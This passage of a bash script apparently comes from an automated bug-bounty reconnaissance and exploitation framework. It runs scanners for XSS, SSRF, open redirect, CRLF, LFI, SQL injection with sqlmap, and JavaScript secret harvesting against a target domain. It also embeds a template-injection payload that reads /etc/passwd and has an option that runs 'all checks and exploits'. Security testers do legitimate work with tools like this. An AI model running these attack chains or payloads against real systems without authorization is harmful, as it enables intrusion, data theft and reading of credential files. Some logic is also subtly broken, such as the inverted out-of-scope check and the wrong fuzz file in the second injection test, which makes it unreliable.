				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function jschecks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$JSCHECKS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Javascript Scan ${reset}\n\n"
			start=`date +%s`
			printf "${yellow} Running : Fetching Urls 1/5${reset}\n"
			cat js/url_extract_js.txt | cut -d '?' -f 1 | grep -iE "\.js$" | anew -q js/jsfile_links.txt
			cat js/url_extract_js.txt | subjs | anew -q js/jsfile_links.txt
			printf "${yellow} Running : Resolving JS Urls 2/5${reset}\n"
			cat js/jsfile_links.txt | httpx -follow-redirects -H "${HEADER}" -silent -timeout 15 -status-code -no-color | grep "[200]" | cut -d ' ' -f1 | anew -q js/js_livelinks.txt
			printf "${yellow} Running : Gathering endpoints 3/5${reset}\n"
			interlace -tL js/js_livelinks.txt -threads 10 -c "python3 $tools/LinkFinder/linkfinder.py -d -i _target_ -o cli >> js/js_endpoints.txt" &>/dev/null
			printf "${yellow} Running : Gathering secrets 4/5${reset}\n"
			cat js/js_livelinks.txt | eval nuclei -silent -t ~/nuclei-templates/exposed-tokens/ -o js/js_secrets.txt $DEBUG_STD
			printf "${yellow} Running : Building wordlist 5/5${reset}\n"
			cat js/js_livelinks.txt | eval python3 $tools/getjswords.py $DEBUG_ERROR | anew -q webs/dict_words.txt
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Javascript Scan Finished in ${runtime}\n"
			printf "${bblue} Results are saved in js folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$JSCHECKS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function wordlist_gen(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WORDLIST" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Wordlist generation ${reset}\n\n"
			start=`date +%s`
			cat .tmp/url_extract_tmp.txt | unfurl -u keys | sed 's/[][]//g' | sed 's/[#]//g' | sed 's/[}{]//g' | anew -q webs/dict_words.txt
			cat .tmp/url_extract_tmp.txt | unfurl -u path | anew -q webs/dict_paths.txt
			touch $called_fn_dir/.${FUNCNAME[0]}
			text="${bblue}\n Wordlists Generated\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue} Results are saved in webs/dict_[words|paths].txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$WORDLIST" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

###############################################################################################################
######################################### VULNERABILITIES #####################################################
###############################################################################################################

function brokenLinks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$BROKENLINKS" = true ] ; then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Broken links checks ${reset}\n\n"
		start=`date +%s`
		gospider -S webs/webs.txt --js -t 10 -H "${HEADER}" --sitemap --robots -w -r | egrep -o 'https?://[^ ]+' | sed 's/]$//' | grep -v ".$domain" | httpx -status-code -follow-redirects -timeout 15 -silent -no-color | grep '\[404\]' | cut -d ' ' -f1 | anew -q .tmp/brokenLinks_total.txt
		NUMOFLINES=$(eval cat .tmp/brokenLinks_total.txt $DEBUG_ERROR | cut -d ' ' -f2 | anew webs/brokenLinks.txt | wc -l)
		touch $called_fn_dir/.${FUNCNAME[0]}
		end=`date +%s`
		getElapsedTime $start $end
		if [ "$NUMOFLINES" -gt 0 ]; then
			text="${bred}\n ${NUMOFLINES} new broken links found in ${runtime}${reset}\n\n"
		fi
		printf "${bblue}\n Broken links checks Finished in ${runtime}\n"
		printf "${bblue} Results are saved in webs/brokenLinks.txt ${reset}\n"
		printf "${bgreen}#######################################################################\n\n"
	else
		if [ "$BROKENLINKS" = false ]; then
			printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function xss(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$XSS" = true ]
	then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} XSS Analysis ${reset}\n\n"
		start=`date +%s`
		cat gf/xss.txt | qsreplace FUZZ | Gxss -c 100 -p Xss | anew -q .tmp/xss_reflected.txt
		if [ "$DEEP" = true ] ; then
			if [ -n "$XSS_SERVER" ]; then
				sed -i "s/^blindPayload = \x27\x27/blindPayload = \x27${XSS_SERVER}\x27/" $tools/XSStrike/core/config.py
				eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/xss_reflected.txt -t 30 --crawl --blind --skip > vulns/xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			else
				printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n"
				eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/xss_reflected.txt -t 30 --crawl --skip > vulns/xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			fi
		else
			if [[ $(cat .tmp/xss_reflected.txt | wc -l) -le 200 ]]
			then
				if [ -n "$XSS_SERVER" ]; then
					sed -i "s/^blindPayload = \x27\x27/blindPayload = \x27${XSS_SERVER}\x27/" $tools/XSStrike/core/config.py
					eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/xss_reflected.txt -t 30 --crawl --blind --skip > vulns/xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				else
					printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n"
					eval python3 $tools/XSStrike/xsstrike.py --seeds .tmp/xss_reflected.txt -t 30 --crawl --skip > vulns/xss.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				fi
			else
				printf "${bred} Skipping XSS: Too Much URLs to test, try with --deep flag${reset}\n"
			fi
		fi
		end=`date +%s`
		getElapsedTime $start $end
		printf "${bblue}\n XSS Analysis Finished in ${runtime}\n"
		printf "${bblue} Results are saved in vulns/xss.txt${reset}\n"
		printf "${bgreen}#######################################################################\n\n"
	else
		if [ "$XSS" = false ]; then
			printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function cors(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CORS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} CORS Scan ${reset}\n\n"
			start=`date +%s`
			eval python3 $tools/Corsy/corsy.py -i webs/webs.txt > webs/cors.txt $DEBUG_STD
			eval cat webs/cors.txt $DEBUG_ERROR && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CORS Scan Finished in ${runtime}\n"
			printf "${bblue} Results are saved in webs/cors.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$CORS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function open_redirect(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$OPEN_REDIRECT" = true ]
		then
			if [ "$DEEP" = true ] ; then
				printf "${bgreen}#######################################################################\n"
				printf "${bblue} Open redirects checks ${reset}\n"
				start=`date +%s`
				cat gf/redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
				eval python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt $DEBUG_ERROR | grep "^http" > vulns/redirect.txt
				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" vulns/redirect.txt
				touch $called_fn_dir/.${FUNCNAME[0]}
				end=`date +%s`
				getElapsedTime $start $end
				printf "${bblue}\n Open Redirects Finished in ${runtime}\n"
				printf "${bblue} Results are saved in vulns/openredirex.txt ${reset}\n"
				printf "${bgreen}#######################################################################\n"
			else
				if [[ $(cat gf/redirect.txt | wc -l) -le 1000 ]]
				then
					printf "${bgreen}#######################################################################\n"
					printf "${bblue} Open redirects checks ${reset}\n"
					start=`date +%s`
					cat gf/redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
					eval python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt $DEBUG_ERROR | grep "^http" > vulns/redirect.txt
					sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" vulns/redirect.txt
					touch $called_fn_dir/.${FUNCNAME[0]}
					end=`date +%s`
					getElapsedTime $start $end
					printf "${bblue}\n Open Redirects Finished in ${runtime}\n"
					printf "${bblue} Results are saved in vulns/redirect.txt ${reset}\n"
				else
					printf "${bred} Skipping Open redirects: Too Much URLs to test, try with --deep flag${reset}\n"
				fi
			fi
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$OPEN_REDIRECT" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function ssrf_checks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SSRF_CHECKS" = true ]
	then
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} SSRF checks ${reset}\n"
		if [ -n "$COLLAB_SERVER" ]; then
			if [ "$DEEP" = true ] ; then
				start=`date +%s`
				cat gf/ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
				COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
				echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
				echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
				for url in $(cat .tmp/tmp_ssrf.txt); do
					ffuf -v -H "${HEADER}" -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssrf.txt
				done

				eval python3 $tools/ssrf.py $dir/gf/ssrf.txt $COLLAB_SERVER_FIX $DEBUG_ERROR | anew -q vulns/ssrf.txt

				touch $called_fn_dir/.${FUNCNAME[0]}
				end=`date +%s`
				getElapsedTime $start $end
				printf "${bblue}\n SSRF Finished in ${runtime}\n"
				printf "${bblue} Results are saved in ssrf_confirmed.txt ${reset}\n"
			else
				if [[ $(cat gf/ssrf.txt | wc -l) -le 1000 ]]
				then
					start=`date +%s`
					cat gf/ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
					COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
					echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
					echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
					for url in $(cat .tmp/tmp_ssrf.txt); do
						ffuf -v -H "${HEADER}" -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssrf.txt
					done
					eval python3 $tools/ssrf.py $dir/gf/ssrf.txt $COLLAB_SERVER_FIX $DEBUG_ERROR | anew -q vulns/ssrf.txt
					touch $called_fn_dir/.${FUNCNAME[0]}
					end=`date +%s`
					getElapsedTime $start $end
					printf "${bblue}\n SSRF Finished in ${runtime}, check your callback server\n"
					printf "${bblue} Results are saved in vulns/ssrf.txt ${reset}\n"
				else
					printf "${bred} Skipping SSRF: Too Much URLs to test, try with --deep flag${reset}\n"
				fi
			fi
		else
			printf "${bred}\n No COLLAB_SERVER defined\n"
		fi
		printf "${bgreen}#######################################################################\n"
	else
		if [ "$SSRF_CHECKS" = false ]; then
			printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function crlf_checks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CRLF_CHECKS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} CRLF checks ${reset}\n"
			start=`date +%s`
			eval crlfuzz -l webs/webs.txt -o vulns/crlf.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CRLF Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in crlf.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$CRLF_CHECKS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function lfi(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$LFI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} LFI checks ${reset}\n"
			start=`date +%s`
			cat gf/lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
			for url in $(cat .tmp/tmp_lfi.txt); do
				ffuf -v -mc 200 -H "${HEADER}" -w $lfi_wordlist -u $url -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/lfi.txt
			done
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n LFI Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in lfi.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$LFI" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function ssti(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SSTI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} SSTI checks ${reset}\n"
			start=`date +%s`

			cat gf/ssti.txt | qsreplace "ssti{{7*7}}" | anew -q .tmp/ssti_fuzz.txt
			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "ssti49" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssti.txt

			cat gf/ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | anew -q .tmp/ssti_fuzz2.txt
			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssti.txt

			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SSTI Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in ssti.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$SSTI" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function sqli(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SQLI" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} SQLi checks ${reset}\n"
			start=`date +%s`
			cat gf/sqli.txt | qsreplace FUZZ | anew -q .tmp/tmp_sqli.txt
			interlace -tL .tmp/tmp_sqli.txt -threads 10 -c "python3 $tools/sqlmap/sqlmap.py -u _target_ -b --batch --disable-coloring --random-agent --output-dir=sqlmap" &>/dev/null
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SQLi Finished in ${runtime}${reset}\n"
			printf "${bblue} Results are saved in sqlmap folder ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$SQLI" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function test_ssl(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$TEST_SSL" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} SSL Test ${reset}\n"
			start=`date +%s`
			eval $tools/testssl.sh/testssl.sh --quiet --color 0 -U -iL hosts/ips.txt $DEBUG_ERROR > hosts/testssl.txt && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n SSL Test Finished in ${runtime}\n"
			printf "${bblue} Results are saved in hosts/testssl.txt ${reset}\n"
			printf "${bgreen}#######################################################################\n"
		else
			if [ "$TEST_SSL" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

###############################################################################################################
########################################## OPTIONS & MGMT #####################################################
###############################################################################################################

function deleteOutScoped(){
	if [ -z "$1" ]
	then
		cat $1 | while read outscoped
		do
			if  grep -q  "^[*]" <<< $outscoped
			then
				outscoped="${outscoped:1}"
				sed -i /"$outscoped$"/d  $2
			else
			sed -i /$outscoped/d  $2
			fi
		done
	fi
}

function getElapsedTime {
	runtime=""
	local T=$2-$1
	local D=$((T/60/60/24))
	local H=$((T/60/60%24))
	local M=$((T/60%60))
	local S=$((T%60))
	(( $D > 0 )) && runtime="$runtime$D days, "
	(( $H > 0 )) && runtime="$runtime$H hours, "
	(( $M > 0 )) && runtime="$runtime$M minutes, "
	runtime="$runtime$S seconds."
}

function isAsciiText {
	IS_ASCII="False";
	if [[ $(file $1 | grep -o 'ASCII text$') == "ASCII text" ]]
	then
		IS_ASCII="True";
	else
		IS_ASCII="False";
	fi
}

function output(){
	mkdir -p $dir_output
	mv $dir $dir_output
}

function start(){

	global_start=`date +%s`

	if [ "$NOTIFICATION" = true ] ; then
		NOTIFY="notify -silent"
	else
	    NOTIFY=""
	fi

	echo "****** 🙏 Thank you for making this world safer ******" | $NOTIFY
	tools_installed

	if [ -z "$domain" ]
	then
		if [ -n "$list" ]
		then
			if [ -z "$domain" ]
			then
				domain="Multi"
				dir=$SCRIPTPATH/Recon/$domain
				called_fn_dir=$dir/.called
			fi
			if [[ "$list" = /* ]]; then
				install -D $list $dir/webs/webs.txt
			else
				install -D $SCRIPTPATH/$list $dir/webs/webs.txt
			fi
		fi
	else
		dir=$SCRIPTPATH/Recon/$domain
		called_fn_dir=$dir/.called_fn
	fi

	if [ -z "$domain" ]
	then
		printf "\n\n${bred} No domain or list provided ${reset}\n\n"
		exit
	fi

	if [ ! -d "$called_fn_dir" ]
	then
		mkdir -p $called_fn_dir
	fi

	cd $dir
	mkdir -p .tmp osint subdomains webs hosts vulns
	printf "\n"
	printf "${bred} Target: ${domain}\n\n"
}

#Don't call me, I am not finished yet
function html_report(){
	eval cp "static/index.html" $dir $DEBUG_ERROR
	#changing title to target.com
	sed -i "s/CHANGE_ME_TITLE/$domain/g" "$dir/index.html"
	#subdomains
	lineToAppend=""
	if [ -f "$dir/subdomains/subdomains.txt" ]; then
		cat $dir/subdomains/subdomains.txt | while read sub; do lineToAppend="$lineToAppend <li><a href='$sub'>$sub</a></li><br>" ; done
	else
		lineToAppend="<li><a href='\#'>No Jslinks Links Found For Target</a></li><br>"
	fi
	sed -i "s/CHANGE_ME_SUB_DOMAINS/$lineToAppend/g" "$dir/index.html"
	#Screenshots
	lineToAppend=""
}

function end(){
	find $dir -type f -empty | grep -v "called_fn" | xargs rm -f &>/dev/null
	find $dir -type d -empty | grep -v "called_fn" | xargs rm -rf &>/dev/null

	if [ "$REMOVETMP" = true ]
	then
		rm -rf $dir/.tmp
	fi

	if [ -n "$dir_output" ]
	then
		output
		finaldir=$dir_output
	else
		finaldir=$dir
	fi
	global_end=`date +%s`
	getElapsedTime $global_start $global_end
	printf "${bgreen}#######################################################################\n"
	text="${bred} Finished Recon on: ${domain} under ${finaldir} in: ${runtime} ${reset}\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	printf "${bgreen}#######################################################################\n"
	#Seperator for more clear messges in telegram_Bot
	echo "******  Stay safe 🦠 and secure 🔐  ******" | $NOTIFY
}

###############################################################################################################
########################################### MODES & MENUS #####################################################
###############################################################################################################

function osint(){
	if [ -n "$list" ]
	then
		for domain in $(cat $list); do
			start
			domain_info
			google_dorks
			github_dorks
			metadata
			emails
			end
		done
	else
		start
		domain_info
		google_dorks
		github_dorks
		metadata
		emails
		end
	fi
}

function all(){
	if [ -n "$list" ]
	then
		for domain in $(cat $list); do
			start
			domain_info
			google_dorks
			subdomains_full
			subtakeover
			webprobe_full
			screenshot
			favicon
			portscan
			waf_checks
			nuclei_check
			github_dorks
			cms_scanner
			fuzz
			cors
			params
			urlchecks
			wordlist_gen
			url_gf
			open_redirect
			ssrf_checks
			crlf_checks
			lfi
			ssti
			sqli
			jschecks
			xss
			brokenLinks
			test_ssl
			end
		done
	else
		start
		domain_info
		google_dorks
		subdomains_full
		subtakeover
		webprobe_full
		screenshot
		favicon
		portscan
		waf_checks
		nuclei_check
		github_dorks
		cms_scanner
		fuzz
		cors
		params
		urlchecks
		wordlist_gen
		url_gf
		open_redirect
		ssrf_checks
		crlf_checks
		lfi
		ssti
		sqli
		jschecks
		xss
		brokenLinks
		test_ssl
		end
	fi
}

function recon(){
	if [ -n "$list" ]
	then
		for domain in $(cat $list); do
			start
			domain_info
			google_dorks
			github_dorks
			metadata
			emails
			subdomains_full
			subtakeover
			webprobe_full
			screenshot
			favicon
			portscan
			waf_checks
			nuclei_check
			cms_scanner
			fuzz
			params
			urlchecks
			wordlist_gen
			url_gf
			jschecks
			test_ssl
			end
		done
	else
		start
		domain_info
		google_dorks
		github_dorks
		metadata
		emails
		subdomains_full
		subtakeover
		webprobe_full
		screenshot
		favicon
		portscan
		waf_checks
		nuclei_check
		cms_scanner
		fuzz
		params
		urlchecks
		wordlist_gen
		url_gf
		jschecks
		test_ssl
		end
	fi
}

function help(){
	printf "\n Usage: $0 [-d DOMAIN] [-l list.txt] [-x oos.txt] [-r] [-a] [-s] [-g]"
	printf "\n           	      [-t] [-w] [-i] [-v] [-h] [--deep] [--fs] [-o OUTPUT]\n\n"
	printf " ${bblue}TARGET OPTIONS${reset}\n"
	printf "   -d DOMAIN        Target domain\n"
	printf "   -l list.txt      Targets list, one per line\n"
	printf "   -x oos.txt       Exclude subdomains list (Out Of Scope)\n"
	printf " \n"
	printf " ${bblue}MODE OPTIONS${reset}\n"
	printf "   -r               Perform complete recon\n"
	printf "   -a               Perform all checks and exploits\n"
	printf "   -s               Full subdomains scan (Subs, tko and probe)\n"
	printf "   -g               Gentle mode (Dorks, Subs, ports, nuclei, fuzz, cors and ssl)\n"
	printf "   -w               Perform web checks only without subs ${yellow}(-l required)${reset}\n"
	printf "   -t               Osint mode, completely passive \n"
	printf "   -i               Check all needed tools\n"
	printf "   -v               Debug/verbose mode, no file descriptor redir\n"
	printf "   -h               Show this help\n"
	printf " \n"
	printf " ${bblue}GENERAL OPTIONS${reset}\n"
	printf "   --deep           Deep scan (Enable some slow options for deeper scan)\n"
	printf "   --fs             Full scope (Enable widest scope *domain* options)\n"
	printf "   -o output/path   Define output folder\n"
	printf " \n"
	printf " ${bblue}USAGE EXAMPLES${reset}\n"
	printf " Full recon:\n"
	printf " ./reconftw.sh -d example.com -a\n"
	printf " \n"
	printf " Subdomain scanning with multiple targets:\n"
	printf " ./reconftw.sh -l targets.txt -s\n"
	printf " \n"
	printf " Web scanning for subdomain list:\n"
	printf " ./reconftw.sh -d example.com -l targets.txt -w\n"
	printf " \n"
	printf " Full recon with custom output and excluded subdomains list:\n"
	printf " ./reconftw.sh -d example.com -x out.txt -a -o custom/path\n"
}

###############################################################################################################
########################################### START SCRIPT  #####################################################
###############################################################################################################

banner

if [ -z "$1" ]
then
   help
   tools_installed
   exit
fi

while getopts ":hd:-:l:x:vairsxwgto:" opt; do
	general=$@
	if [[ $general == *"-v"* ]]; then
  		unset DEBUG_STD
		unset DEBUG_ERROR
	fi
	if [[ $general == *"--deep"* ]]; then
  		DEEP=true
	fi
	if [[ $general == *"--fs"* ]]; then
  		FULLSCOPE=true
	fi
	case ${opt} in
		d ) domain=$OPTARG
			;;
		l ) list=$OPTARG
			;;
		x ) outOfScope_file=$OPTARG
			isAsciiText $outOfScope_file
			if [ "False" = "$IS_ASCII" ]
			then
				printf "\n\n${bred} Out of Scope file is not a text file${reset}\n\n"
				exit
			fi
			;;
		s ) if [ -n "$list" ]
			then
				for domain in $(cat $list); do
					start
					subdomains_full
					subtakeover
					end
				done
			else
				start
				subdomains_full
				subtakeover
				end
			fi
			exit
			;;
		a ) all
			exit
			;;
		w ) start
			if [ -n "$list" ]
			then
				if [[ "$list" = /* ]]; then
					cp $list $dir/webs/webs.txt
				else
					cp $SCRIPTPATH/$list $dir/webs/webs.txt
				fi
			fi
			waf_checks
			nuclei_check
			cms_scanner
			fuzz
			cors
			params
			urlchecks
			wordlist_gen
			url_gf
			open_redirect
			ssrf_checks
			crlf_checks
			lfi
			ssti
			sqli
			jschecks
			xss
			brokenLinks
			test_ssl
			end
			exit
			;;
		t ) osint
			exit
			;;
		r ) recon
			exit
			;;
		i ) tools_full
			exit
			;;
		g ) start
			PORTSCAN_ACTIVE=false
			domain_info
			google_dorks
			subdomains_full
			subtakeover
			webprobe_full
			screenshot
			favicon
			portscan
			github_dorks
			cms_scanner
			cors
			end
			exit
			;;
		o ) dir_output=$OPTARG
			output
			;;
		\? | h | : | - | * )
			help
			;;
	esac
done
shift $((OPTIND -1))
